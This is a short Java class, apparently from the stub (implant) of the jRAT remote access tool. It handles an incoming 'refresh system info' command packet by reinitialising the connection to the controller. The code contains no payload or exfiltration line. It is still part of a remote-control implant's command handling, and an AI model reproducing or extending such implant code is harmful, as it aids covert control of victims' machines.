package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;

public class Packet27RefreshSystemInfo extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.initialize();
	}

}
